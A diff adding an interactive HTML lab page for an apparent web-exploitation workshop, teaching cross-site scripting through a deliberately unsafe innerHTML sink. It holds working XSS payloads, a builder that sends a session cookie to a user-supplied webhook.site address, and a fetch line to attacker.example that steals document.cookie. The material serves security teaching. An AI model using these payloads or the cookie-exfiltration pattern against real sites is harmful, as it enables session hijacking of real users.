@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>XSS Lab — Securinets Esprit</title>
+<style>
+:root{
+  --red:#b31217; --red-dark:#7a0d10; --red-light:#e23a3e;
+  --bg:#ffffff; --bg2:#f7f3f3; --ink:#161414; --ink2:#5a5252;
+  --line:#e7dede; --danger:#b31217; --safe:#1d7a4a; --mono:ui-monospace,Consolas,monospace;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark){
+  :root{ --bg:#141011; --bg2:#1c1617; --ink:#f2eaea; --ink2:#c9b9b9; --line:#3a2b2c; }
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:system-ui,sans-serif;line-height:1.6;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+.hero{
+  background:
+    radial-gradient(circle at 20px 20px, var(--red) 1.4px, transparent 1.6px) 0 0/16px 16px,
+    linear-gradient(180deg,var(--ink) 0%, var(--red-dark) 70%, var(--red) 100%);
+  color:#fff;padding:3rem 1.5rem 2.5rem;text-align:center
+}
+.hero h1{margin:.2rem 0;font-size:clamp(28px,5vw,42px);letter-spacing:1px}
+.hero h1 span{color:#ffd9d9}
+.hero p{color:#f0d6d6;max-width:620px;margin:.6rem auto 0;font-size:15px}
+.badge{display:inline-block;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.35);
+  border-radius:999px;padding:4px 14px;font-size:12px;letter-spacing:2px;text-transform:uppercase}
+main{max-width:780px;margin:0 auto;padding:1.5rem}
+section{margin:2.5rem 0;padding-top:.5rem}
+h2{font-size:21px;border-left:4px solid var(--red);padding-left:10px;margin-bottom:.3rem}
+.step{color:var(--red);font-weight:700;font-size:13px;letter-spacing:1px;text-transform:uppercase}
+p.lead{color:var(--ink2);font-size:15px}
+.card{background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.2rem;margin:1rem 0}
+pre{font-family:var(--mono);font-size:13.5px;white-space:pre-wrap;word-break:break-word;margin:0;line-height:1.7}
+.tag{color:var(--ink2)}
+.kw{color:var(--red-light);font-weight:600}
+.inject{background:#fde3e3;color:#7a0d10;border-radius:4px;padding:1px 3px}
+.inject.danger{background:var(--red);color:#fff;font-weight:600}
+@media (prefers-color-scheme: dark){.inject{background:#4a1416;color:#ffb3b3}.inject.danger{background:var(--red);color:#fff}}
+input[type=text]{width:100%;padding:12px 14px;border-radius:10px;border:1.5px solid var(--line);
+  background:var(--bg);color:var(--ink);font-family:var(--mono);font-size:14px}
+input[type=text]:focus{outline:2px solid var(--red-light);border-color:var(--red-light)}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:.7rem}
+button{background:var(--red);color:#fff;border:0;border-radius:10px;padding:10px 16px;
+  font-size:13.5px;font-weight:600;cursor:pointer}
+button.ghost{background:transparent;border:1.5px solid var(--red);color:var(--red)}
+button:active{transform:scale(.97)}
+.status{font-size:13px;font-weight:600;padding:8px 12px;border-radius:8px;margin-top:.6rem;display:none}
+.status.safe{display:block;background:#e4f5ec;color:var(--safe)}
+.status.danger{display:block;background:#fbe2e2;color:var(--danger)}
+@media (prefers-color-scheme: dark){.status.safe{background:#123324}.status.danger{background:#3a1214}}
+.browser{border:1px solid var(--line);border-radius:12px;overflow:hidden;margin-top:1rem}
+.browser .bar{background:var(--bg2);padding:7px 10px;font-size:12px;color:var(--ink2);border-bottom:1px solid var(--line);display:flex;gap:6px;align-items:center}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--line)}
+.browser .page{padding:16px;min-height:60px;font-size:14px;background:var(--bg)}
+.alertbox{position:relative;background:#fff;color:#111;border:1px solid #999;border-radius:6px;
+  box-shadow:0 6px 18px rgba(0,0,0,.25);padding:14px;max-width:300px;margin:10px 0;font-size:13px;
+  display:none;animation:pop .25s ease}
+@keyframes pop{from{transform:scale(.9);opacity:0}to{transform:scale(1);opacity:1}}
+.alertbox b{display:block;margin-bottom:6px;font-size:12px;color:#555}
+.alertbox button{margin-top:10px;background:#eee;color:#111;padding:5px 12px;font-size:12px}
+.payloads{display:grid;gap:10px}
+.pl{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:12px 14px}
+.pl code{font-family:var(--mono);font-size:13px;color:var(--red-light);word-break:break-word}
+.pl .why{color:var(--ink2);font-size:13px;margin-top:5px}
+.pl button{margin-top:8px}
+.copied{color:var(--safe);font-size:12px;font-weight:600;margin-left:8px}
+.sysalert{position:fixed;top:18px;left:50%;transform:translateX(-50%) scale(.9);background:#f1f1f1;color:#111;
+  border:1px solid #999;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,.3);width:280px;z-index:999;
+  opacity:0;pointer-events:none;transition:opacity .2s, transform .2s}
+.sysalert.show{opacity:1;transform:translateX(-50%) scale(1);pointer-events:auto}
+.sysalert .top{background:#e2e2e2;padding:8px 12px;font-size:12px;color:#555;border-bottom:1px solid #ccc;border-radius:8px 8px 0 0}
+.sysalert .body{padding:16px 14px;font-size:14px}
+.sysalert .foot{padding:8px 12px 12px;text-align:right}
+.sysalert button{background:#2563eb;padding:6px 18px;font-size:13px}
+.flow{display:flex;align-items:center;justify-content:space-between;margin:1.2rem 0;position:relative}
+.flow .node{flex:1;text-align:center;font-size:12.5px;color:var(--ink2)}
+.flow .node i{display:block;width:46px;height:46px;border-radius:50%;background:var(--bg2);border:1.5px solid var(--line);
+  margin:0 auto 6px;font-size:20px;display:flex;align-items:center;justify-content:center}
+.flow .track{flex:2;height:2px;background:var(--line);position:relative;margin-top:-24px}
+.flow .dot{position:absolute;top:-4px;left:0;width:10px;height:10px;border-radius:50%;background:var(--red);opacity:0}
+.flow .dot.go{animation:travel 1.4s ease forwards}
+@keyframes travel{0%{left:0;opacity:1}90%{opacity:1}100%{left:calc(100% - 10px);opacity:1}}
+.steps{margin-top:.6rem}
+.steps div{opacity:0;transform:translateY(4px);transition:opacity .3s,transform .3s;font-size:13.5px;color:var(--ink2);padding:3px 0}
+.steps div.show{opacity:1;transform:none}
+.steps div b{color:var(--ink)}
+footer{text-align:center;color:var(--ink2);font-size:12px;padding:2rem 1rem}
+</style>
+
+<!-- ===== Added visuals/animations (does not modify anything above) ===== -->
+<style>
+.xv-wrap{margin-top:1.1rem;border:1px solid var(--line);border-radius:14px;padding:14px 16px;background:var(--bg2)}
+.xv-title{font-size:11.5px;letter-spacing:1.5px;text-transform:uppercase;color:var(--ink2);font-weight:700;margin-bottom:10px}
+
+/* ---- Step 1: data vs code boundary ---- */
+.xv-boundary{position:relative;display:flex;gap:0;border-radius:10px;overflow:hidden;border:1.5px solid var(--line)}
+.xv-zone{flex:1;padding:16px 12px;text-align:center;font-size:12.5px;color:var(--ink2);position:relative;background:var(--bg);transition:background .35s,color .35s}
+.xv-zone .xv-ico{font-size:22px;display:block;margin-bottom:4px}
+.xv-zone.xv-data{border-right:1.5px dashed var(--line)}
+.xv-zone.xv-code.xv-hot{background:var(--red);color:#fff}
+.xv-zone.xv-code.xv-hot .xv-ico{animation:xv-shake .4s ease}
+.xv-zone.xv-data.xv-calm{background:#e4f5ec}
+@media (prefers-color-scheme: dark){.xv-zone.xv-data.xv-calm{background:#123324}}
+.xv-ball{position:absolute;top:50%;left:8%;width:12px;height:12px;border-radius:50%;background:var(--red);
+  transform:translate(0,-50%) scale(0);box-shadow:0 0 0 0 rgba(179,18,23,.5);z-index:2}
+.xv-ball.xv-fire-safe{animation:xv-hop-safe 1s ease forwards}
+.xv-ball.xv-fire-danger{animation:xv-hop-danger 1s ease forwards}
+@keyframes xv-hop-safe{
+  0%{left:8%;transform:translate(0,-50%) scale(1)}
+  100%{left:42%;transform:translate(0,-50%) scale(1)}
+}
+@keyframes xv-hop-danger{
+  0%{left:8%;transform:translate(0,-50%) scale(1)}
+  55%{left:50%;transform:translate(0,-70%) scale(1.15)}
+  100%{left:88%;transform:translate(0,-50%) scale(1)}
+}
+@keyframes xv-shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-3px) rotate(-6deg)}75%{transform:translateX(3px) rotate(6deg)}}
+.xv-caption{text-align:center;font-size:12px;color:var(--ink2);margin-top:8px;min-height:16px}
+
+/* ---- Step 2: onerror execution timeline ---- */
+.xv-tl{display:flex;flex-direction:column;gap:0;margin-top:4px}
+.xv-tlrow{display:flex;gap:10px;align-items:flex-start;opacity:.25;transform:translateX(-6px);transition:opacity .35s,transform .35s}
+.xv-tlrow.on{opacity:1;transform:none}
+.xv-tlnum{flex:0 0 auto;width:22px;height:22px;border-radius:50%;background:var(--bg);border:1.5px solid var(--line);
+  display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--ink2);margin-top:1px}
+.xv-tlrow.on .xv-tlnum{background:var(--red);border-color:var(--red);color:#fff}
+.xv-tltext{font-size:13px;color:var(--ink2);padding-top:2px}
+.xv-tlrow.on .xv-tltext{color:var(--ink)}
+.xv-tlline{width:1.5px;background:var(--line);margin-left:10.25px;height:14px}
+.xv-tlrow.on + .xv-tlline{background:var(--red)}
+.xv-flash{position:relative}
+.xv-flash.xv-pulse::after{content:"";position:absolute;inset:0;border-radius:12px;pointer-events:none;
+  box-shadow:0 0 0 0 rgba(179,18,23,.55);animation:xv-ring .6s ease}
+@keyframes xv-ring{0%{box-shadow:0 0 0 0 rgba(179,18,23,.55)}100%{box-shadow:0 0 0 14px rgba(179,18,23,0)}}
+
+/* ---- Step 4: injection-context map ---- */
+.xv-ctxmap{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px}
+.xv-ctx{border:1.5px solid var(--line);border-radius:10px;padding:10px;text-align:center;font-size:12px;color:var(--ink2);
+  background:var(--bg);opacity:0;transform:translateY(6px);transition:opacity .4s,transform .4s}
+.xv-ctx.show{opacity:1;transform:none}
+.xv-ctx .xv-ico{font-size:20px;display:block;margin-bottom:4px;animation:xv-float 2.6s ease-in-out infinite}
+.xv-ctx code{display:block;margin-top:5px;font-family:var(--mono);font-size:11px;color:var(--red-light);word-break:break-word}
+@keyframes xv-float{0%,100%{transform:translateY(0)}50%{transform:translateY(-3px)}}
+
+/* ---- Step 5: cookie hijack mini-comic ---- */
+.xv-hijack{display:flex;align-items:center;gap:6px;justify-content:space-between;margin-top:6px}
+.xv-hpanel{flex:1;text-align:center;font-size:12px;color:var(--ink2);padding:10px 6px;border-radius:10px;border:1.5px solid var(--line);background:var(--bg)}
+.xv-hpanel .xv-ico{font-size:24px;display:block;margin-bottom:4px}
+.xv-harrow{flex:0 0 28px;text-align:center;color:var(--red);font-size:18px;position:relative;overflow:visible}
+.xv-harrow span{display:inline-block;animation:xv-drift 1.4s ease-in-out infinite}
+@keyframes xv-drift{0%,100%{transform:translateX(0);opacity:.6}50%{transform:translateX(4px);opacity:1}}
+.xv-hpanel.xv-win{border-color:var(--red);background:#fde3e3}
+@media (prefers-color-scheme: dark){.xv-hpanel.xv-win{background:#4a1416}}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <span class="badge">Securinets Esprit</span>
+  <h1>Cross-Site <span>Scripting</span></h1>
+  <p>A hands-on walkthrough. You will break the boundary between data and code — live, in your browser.</p>
+</div>
+
+<main>
+
+<section id="s1">
+  <div class="step">Step 1 — the code behind the search box</div>
+  <h2>Where does your typing go?</h2>
+  <p class="lead">This site has a search box. Below is the real code that puts your text on the page.
+  Start typing and watch it drop straight in — nobody checks what you type first.</p>
+
+  <div class="card">
+    <pre id="codeView"><span class="tag">&lt;p&gt;Search results for: </span><span id="slot" class="inject">your text shows up here</span><span class="tag">&lt;/p&gt;</span></pre>
+  </div>
+
+  <input type="text" id="liveInput" placeholder="Type something, e.g. shoes" autocomplete="off">
+  <div id="status1" class="status"></div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">Live view — where does your text land?</div>
+    <div class="xv-boundary" id="xvBoundary">
+      <div class="xv-zone xv-data" id="xvZoneData"><span class="xv-ico">📄</span>HTML page<br>(just displayed)</div>
+      <div class="xv-zone xv-code" id="xvZoneCode"><span class="xv-ico">⚙️</span>JavaScript engine<br>(gets executed)</div>
+      <div class="xv-ball" id="xvBall"></div>
+    </div>
+    <div class="xv-caption" id="xvCaption">Start typing above — watch which side the dot lands on.</div>
+  </div>
+</section>
+
+<section id="s2">
+  <div class="step">Step 2 — your first real payload</div>
+  <h2>Copy it. Paste it above. Watch what happens.</h2>
+  <p class="lead">A payload is just the text you type to break things. This one looks like a broken picture —
+  but when the picture fails to load, it secretly runs code instead.</p>
+
+  <div class="pl">
+    <code id="p1">&lt;img src=x onerror=alert('XSS')&gt;</code>
+    <div class="why">This is a picture tag pointing at a file called "x", which does not exist. When it fails,
+    the browser runs whatever is written after <code>onerror=</code>. No script tag needed.</div>
+    <div class="row">
+      <button onclick="useThis('p1')">Use this payload</button>
+      <span class="copied" id="copiedMsg"></span>
+    </div>
+  </div>
+
+  <p class="lead" style="margin-top:1rem">The box below is a real, working mini page. It takes your text and places it the unsafe way, exactly like the broken code above. If a popup appears, that is not a trick — your browser just ran your code for real.</p>
+  <div class="xv-flash" id="xvBrowserFlash">
+  <div class="browser">
+    <div class="bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span>
+      &nbsp; live page — really running your code</div>
+    <div class="page">
+      <div id="renderedPage">Search results for: <span id="renderedSlot">—</span></div>
+    </div>
+  </div>
+  </div>
+  <div id="status2" class="status"></div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">What the browser does, step by step</div>
+    <div class="xv-tl" id="xvTimeline">
+      <div class="xv-tlrow" id="xvT1"><div class="xv-tlnum">1</div><div class="xv-tltext">Browser sees <code>&lt;img src=x&gt;</code> and tries to fetch a file named "x".</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT2"><div class="xv-tlnum">2</div><div class="xv-tltext">"x" doesn't exist → the image fails to load.</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT3"><div class="xv-tlnum">3</div><div class="xv-tltext">The failure triggers the <code>onerror</code> handler — automatically, no click needed.</div></div>
+      <div class="xv-tlline"></div>
+      <div class="xv-tlrow" id="xvT4"><div class="xv-tlnum">4</div><div class="xv-tltext">Whatever is written inside <code>onerror="..."</code> now runs as real JavaScript.</div></div>
+    </div>
+  </div>
+</section>
+
+<div class="sysalert" id="sysalert">
+  <div class="top">This page says</div>
+  <div class="body" id="sysalertMsg"></div>
+  <div class="foot"><button onclick="document.getElementById('sysalert').classList.remove('show')">OK</button></div>
+</div>
+
+<section id="s5">
+  <div class="step">Step 3 (bonus) — how real hackers actually use this</div>
+  <h2>Make your code quietly send data out</h2>
+  <p class="lead">A popup only proves your code ran. A real attack does not show a popup at all — it quietly
+  sends the victim's cookie to a server the attacker owns. We'll use <a href="https://webhook.site" target="_blank" rel="noopener">webhook.site</a>,
+  a free site that gives you your own private web address and shows you everything anyone sends to it. It stands in for "the attacker's server" here.</p>
+
+  <div class="card">
+    <b>1.</b> Open <a href="https://webhook.site" target="_blank" rel="noopener">webhook.site</a> in a new tab — it gives you a free unique link right away, no sign up.<br><br>
+    <b>2.</b> Copy that link and paste it in the box below.<br><br>
+    <b>3.</b> Click "build payload" to see what it does, step by step, below.
+  </div>
+
+  <input type="text" id="webhookUrl" placeholder="https://webhook.site/your-unique-id" autocomplete="off">
+  <div class="row"><button onclick="buildExfil()">Build payload</button></div>
+
+  <div class="pl" id="exfilBox" style="display:none;margin-top:1rem">
+    <code id="exfilCode"></code>
+    <div class="why">No alert, no popup. The victim sees nothing change on the page.</div>
+    <div class="row"><button onclick="runExfil()">Run it for real</button><span class="copied" id="exfilMsg"></span></div>
+
+    <div class="card" style="margin-top:1rem">
+      <div style="font-size:12px;color:var(--ink2);margin-bottom:6px">What lands in your webhook.site inbox</div>
+      <pre style="font-size:12.5px"><span class="kw">GET</span> /your-unique-id?cookie=<span id="previewCookie" class="inject danger">session=8f3a1c...; role=admin</span>
+Host: webhook.site
+Referer: <span id="previewPage">this-page.html</span></pre>
+      <div class="why" style="margin-top:8px">That's the whole login cookie — the thing the site uses to know who you are.
+      This demo page has no real cookie, so the example above is what a logged-in user's cookie typically looks like.
+      With a real cookie, whoever receives it can paste it into their own browser and become that user, no password needed.</div>
+    </div>
+
+    <div class="flow">
+      <div class="node"><i>👤</i>Victim's browser</div>
+      <div class="track"><div class="dot" id="dot1"></div></div>
+      <div class="node"><i>🎯</i>Your code runs</div>
+      <div class="track"><div class="dot" id="dot2"></div></div>
+      <div class="node"><i>📥</i>Your webhook</div>
+    </div>
+    <div class="steps" id="flowSteps">
+      <div id="fs1"><b>1.</b> The victim opens the page — your code runs inside their browser, with their login.</div>
+      <div id="fs2"><b>2.</b> Your code reads <code>document.cookie</code> — that's the victim's identity.</div>
+      <div id="fs3"><b>3.</b> It quietly sends that cookie to your webhook link in the background.</div>
+      <div id="fs4"><b>4.</b> You check your webhook.site tab — the victim's cookie is sitting there.</div>
+    </div>
+
+    <p class="lead" style="margin-top:.8rem;font-size:13.5px"><b>Heads up:</b> inside this chat preview, outside requests are blocked
+    as a safety rule, so nothing really leaves this tab here even after you click run. Opened as a local file on your own computer,
+    clicking "run it for real" sends a genuine request — check your webhook.site tab for a new entry.</p>
+    <div id="exfilStatus" class="status"></div>
+  </div>
+  <div id="exfilSandbox" style="display:none"></div>
+</section>
+
+<section id="s3">
+  <div class="step">Step 4 — more ways in</div>
+  <h2>Same trick, different disguise</h2>
+  <p class="lead">Some sites block certain words or tags. When one trick is blocked, attackers just try
+  another tag that does the same job. Click any of these to load it above and watch it run.</p>
+
+  <div class="xv-wrap" style="margin-bottom:1rem">
+    <div class="xv-title">Three places your text can land</div>
+    <div class="xv-ctxmap" id="xvCtxMap">
+      <div class="xv-ctx" id="xvCtx1"><span class="xv-ico">🏷️</span>Between two tags<code>&lt;p&gt;[you]&lt;/p&gt;</code></div>
+      <div class="xv-ctx" id="xvCtx2"><span class="xv-ico">🧩</span>Inside an attribute<code>value="[you]"</code></div>
+      <div class="xv-ctx" id="xvCtx3"><span class="xv-ico">🔗</span>As a link's target<code>href="[you]"</code></div>
+    </div>
+  </div>
+
+  <div class="payloads" id="payloadList"></div>
+</section>
+
+<section id="s4">
+  <div class="step">Step 5 — why this is a big deal</div>
+  <h2>It's never just a popup</h2>
+  <p class="lead">The popup is only proof that your code ran. In a real attack, nothing pops up at all —
+  the same spot quietly reads the victim's cookie, acts as if it were them, or sends them to a fake login page.</p>
+  <div class="card">
+    <pre><span class="tag">fetch</span>(<span class="kw">"https://attacker.example/steal?c="</span> + document.cookie)</pre>
+  </div>
+
+  <div class="xv-wrap">
+    <div class="xv-title">Why a cookie alone is enough</div>
+    <div class="xv-hijack">
+      <div class="xv-hpanel"><span class="xv-ico">👤</span>Victim is<br>logged in</div>
+      <div class="xv-harrow"><span>➜</span></div>
+      <div class="xv-hpanel"><span class="xv-ico">📡</span>Cookie sent<br>to attacker</div>
+      <div class="xv-harrow"><span>➜</span></div>
+      <div class="xv-hpanel xv-win"><span class="xv-ico">🕶️</span>Attacker pastes it,<br>no password needed</div>
+    </div>
+  </div>
+
+  <p class="lead">Ask yourself every time: <b>where does my text end up, and what reads it there?</b></p>
+</section>
+
+</main>
+<footer>Securinets Esprit — Web Exploitation Workshop</footer>
+
+<script>
+const payloads = [
+  {code:"&lt;script&gt;alert('XSS')&lt;/script&gt;", why:"The classic. Works only when input lands between HTML tags, not inside an attribute — and only if the site doesn't block &lt;script&gt; tags from rendering."},
+  {code:"&lt;svg onload=alert('XSS')&gt;", why:"An SVG element fires onload the moment it's placed on the page. No user click needed."},
+  {code:"&lt;body onload=alert('XSS')&gt;", why:"If your input can inject a whole body tag, onload fires as soon as the page loads."},
+  {code:'"&gt;&lt;script&gt;alert(1)&lt;/script&gt;', why:"Used when your input lands inside an HTML attribute, e.g. value=\"[input]\". The quote and angle bracket close the attribute and the tag first, before your script starts."},
+  {code:"javascript:alert('XSS')", why:"Used when your input becomes a link's destination, e.g. href=\"[input]\". Clicking the link runs the code instead of navigating."}
+];
+const list = document.getElementById('payloadList');
+payloads.forEach((p,i)=>{
+  const id = 'pl'+i;
+  const div = document.createElement('div');
+  div.className='pl';
+  div.innerHTML = `<code id="${id}">${p.code}</code><div class="why">${p.why}</div>
+    <button onclick="useThis('${id}')">Try this payload</button>`;
+  list.appendChild(div);
+});
+
+/* ------------------------------------------------------------------
+   Hardcoded fake admin cookie used for the exfiltration demo.
+   The payload below will try document.cookie first and fall back to
+   this value, so your webhook always receives a "stolen" session.
+   ------------------------------------------------------------------ */
+const FAKE_ADMIN_COOKIE = 'session=8f3a1c9e2b7d4f10; role=admin';
+
+function decodeHtml(s){ const t=document.createElement('textarea'); t.innerHTML=s; return t.value; }
+function isDangerous(v){
+  return /<\s*script|on\w+\s*=|<\s*svg|<\s*img|<\s*body|javascript:/i.test(v);
+}
+
+window.alert = function(msg){
+  const box = document.getElementById('sysalert');
+  document.getElementById('sysalertMsg').textContent = msg;
+  box.classList.add('show');
+};
+
+/* ------------------------------------------------------------------
+   injectLive(): puts attacker markup into the page the way a
+   vulnerable app does (raw HTML sink) and makes sure the browser
+   REALLY executes it, no matter which tag the payload uses.
+   ------------------------------------------------------------------ */
+function injectLive(container, html){
+  container.innerHTML = '';
+
+  /* javascript: URLs only run when they are a link's destination,
+     so render a real clickable link. */
+  if(/^\s*javascript:/i.test(html)){
+    const a = document.createElement('a');
+    a.href = html.trim();
+    a.textContent = 'click this link → ' + html.trim();
+    container.appendChild(a);
+    return;
+  }
+
+  /* A <body> tag is ignored when injected into an already-parsed page.
+     Convert it to a div so its attributes (and onload) survive. */
+  const normalized = html
+    .replace(/<body\b/gi, '<div data-xss-body')
+    .replace(/<\/body\s*>/gi, '</div>');
+
+  const tpl = document.createElement('template');
+  tpl.innerHTML = normalized;
+
+  /* Script elements parsed from markup are marked "already started"
+     and never run. Pull them out and rebuild them so the browser
+     actually executes them. */
+  const parsedScripts = Array.from(tpl.content.querySelectorAll('script'));
+  parsedScripts.forEach(s => s.remove());
+
+  const bodies = Array.from(tpl.content.querySelectorAll('[data-xss-body]'));
+
+  container.appendChild(tpl.content);
+
+  parsedScripts.forEach(old => {
+    const live = document.createElement('script');
+    Array.from(old.attributes).forEach(a => live.setAttribute(a.name, a.value));
+    live.textContent = old.textContent;
+    container.appendChild(live);   // runs for real here
+  });
+
+  /* Fire the load handler the converted body would have fired. */
+  bodies.forEach(el => {
+    el.removeAttribute('data-xss-body');
+    setTimeout(() => el.dispatchEvent(new Event('load')), 0);
+  });
+}
+
+function render(v){
+  const slot = document.getElementById('slot');
+  const status1 = document.getElementById('status1');
+  const danger = isDangerous(v);
+  slot.textContent = v || 'your text shows up here';
+  slot.className = 'inject' + (danger ? ' danger' : '');
+  if(!v){ status1.className='status'; status1.textContent=''; }
+  else if(danger){
+    status1.className='status danger';
+    status1.textContent = "The browser sees this as a tag or a command, not as plain text.";
+  } else {
+    status1.className='status safe';
+    status1.textContent = "This stays plain text. The browser just shows it, nothing runs.";
+  }
+
+  const renderedSlot = document.getElementById('renderedSlot');
+  const status2 = document.getElementById('status2');
+  if(danger){
+    injectLive(renderedSlot, v);
+    status2.className='status danger';
+    if(/^\s*javascript:/i.test(v)){
+      status2.textContent = 'The link below carries a javascript: URL — click it and the browser runs your code.';
+    } else {
+      status2.textContent = 'This is really happening: your code just ran inside this page.';
+    }
+  } else {
+    renderedSlot.textContent = v || '—';
+    status2.className = v ? 'status safe' : 'status';
+    status2.textContent = v ? 'Nothing ran. It was only ever displayed as text.' : '';
+  }
+}
+
+function buildExfil(){
+  const url = (document.getElementById('webhookUrl').value || 'https://webhook.site/your-unique-id').trim();
+  /* The stolen cookie: real document.cookie if there is one, otherwise the
+     hardcoded fake admin session, so the webhook always receives something. */
+  const payload =
+    '<img src=x onerror="this.onerror=null;this.src=\'' + url +
+    '?cookie=\'+encodeURIComponent(document.cookie||\'' + FAKE_ADMIN_COOKIE + '\')">';
+  document.getElementById('exfilCode').textContent = payload;
+  document.getElementById('exfilBox').style.display='block';
+  document.getElementById('exfilStatus').className='status';
+  document.getElementById('exfilStatus').textContent='';
+  document.getElementById('previewCookie').textContent = document.cookie || FAKE_ADMIN_COOKIE;
+  document.getElementById('previewPage').textContent = location.href.split('/').pop() || 'this-page.html';
+}
+
+function runExfil(){
+  const code = document.getElementById('exfilCode').textContent;
+  if(!code){ return; }
+  document.getElementById('exfilSandbox').innerHTML = '';
+  document.getElementById('exfilSandbox').innerHTML = code;
+  const msg = document.getElementById('exfilMsg');
+  msg.textContent = 'sent — check your webhook.site tab';
+  setTimeout(()=>msg.textContent='',3000);
+  const st = document.getElementById('exfilStatus');
+  st.className='status danger';
+  st.textContent = 'Request fired. Inside this preview it goes nowhere — opened locally, it just reached your webhook.';
+  ['dot1','dot2'].forEach(id=>{ const d=document.getElementById(id); d.classList.remove('go'); void d.offsetWidth; });
+  ['fs1','fs2','fs3','fs4'].forEach(id=>document.getElementById(id).classList.remove('show'));
+  setTimeout(()=>document.getElementById('dot1').classList.add('go'),100);
+  setTimeout(()=>document.getElementById('fs1').classList.add('show'),200);
+  setTimeout(()=>document.getElementById('fs2').classList.add('show'),900);
+  setTimeout(()=>document.getElementById('dot2').classList.add('go'),1500);
+  setTimeout(()=>document.getElementById('fs3').classList.add('show'),1600);
+  setTimeout(()=>document.getElementById('fs4').classList.add('show'),2700);
+}
+
+const liveInput = document.getElementById('liveInput');
+liveInput.addEventListener('input', ()=>render(liveInput.value));
+
+function useThis(id){
+  const raw = decodeHtml(document.getElementById(id).innerHTML);
+  liveInput.value = raw;
+  render(raw);
+  const msg = document.getElementById('copiedMsg');
+  if(msg){ msg.textContent = 'loaded into the input above ↑'; setTimeout(()=>msg.textContent='',2000); }
+  document.getElementById('s1').scrollIntoView({behavior:'smooth', block:'center'});
+}
+render('');
+</script>
+
+<!-- ===== Added animation logic (reads existing globals, never rewrites them) ===== -->
+<script>
+(function(){
+  const ball = document.getElementById('xvBall');
+  const zoneData = document.getElementById('xvZoneData');
+  const zoneCode = document.getElementById('xvZoneCode');
+  const caption = document.getElementById('xvCaption');
+
+  function playBoundary(v){
+    const danger = typeof isDangerous === 'function' ? isDangerous(v) : false;
+    zoneData.classList.remove('xv-calm');
+    zoneCode.classList.remove('xv-hot');
+    ball.classList.remove('xv-fire-safe','xv-fire-danger');
+    void ball.offsetWidth; /* restart animation, same trick used elsewhere on this page */
+
+    if(!v){
+      caption.textContent = 'Start typing above — watch which side the dot lands on.';
+      return;
+    }
+    if(danger){
+      ball.classList.add('xv-fire-danger');
+      setTimeout(()=>zoneCode.classList.add('xv-hot'), 550);
+      caption.textContent = 'Your text crossed the line — the browser is about to treat it as code.';
+    } else {
+      ball.classList.add('xv-fire-safe');
+      setTimeout(()=>zoneData.classList.add('xv-calm'), 550);
+      caption.textContent = 'Your text stayed on the HTML side — it is only ever displayed.';
+    }
+  }
+
+  const liveInputEl = document.getElementById('liveInput');
+  if(liveInputEl){
+    liveInputEl.addEventListener('input', ()=>playBoundary(liveInputEl.value));
+  }
+
+  /* ---- Step 2 timeline + flash, driven by watching status2's own class changes ---- */
+  const status2El = document.getElementById('status2');
+  const flashBox = document.getElementById('xvBrowserFlash');
+  const tlIds = ['xvT1','xvT2','xvT3','xvT4'];
+
+  function resetTimeline(){
+    tlIds.forEach(id=>document.getElementById(id).classList.remove('on'));
+  }
+  function playTimeline(){
+    resetTimeline();
+    tlIds.forEach((id,i)=>{
+      setTimeout(()=>document.getElementById(id).classList.add('on'), 150 + i*260);
+    });
+    flashBox.classList.remove('xv-pulse');
+    void flashBox.offsetWidth;
+    flashBox.classList.add('xv-pulse');
+  }
+
+  if(status2El){
+    new MutationObserver(()=>{
+      if(status2El.classList.contains('danger')){
+        playTimeline();
+      } else {
+        resetTimeline();
+      }
+    }).observe(status2El, {attributes:true, attributeFilter:['class']});
+  }
+
+  /* ---- Step 4 context map: reveal with a small stagger once it scrolls into view ---- */
+  const ctxEls = ['xvCtx1','xvCtx2','xvCtx3'].map(id=>document.getElementById(id)).filter(Boolean);
+  if(ctxEls.length && 'IntersectionObserver' in window){
+    const io = new IntersectionObserver((entries)=>{
+      entries.forEach(entry=>{
+        if(entry.isIntersecting){
+          ctxEls.forEach((el,i)=>setTimeout(()=>el.classList.add('show'), i*140));
+          io.disconnect();
+        }
+      });
+    }, {threshold:.3});
+    io.observe(ctxEls[0]);
+  } else {
+    ctxEls.forEach(el=>el.classList.add('show'));
+  }
+})();
+</script>
+</body>
+</html>
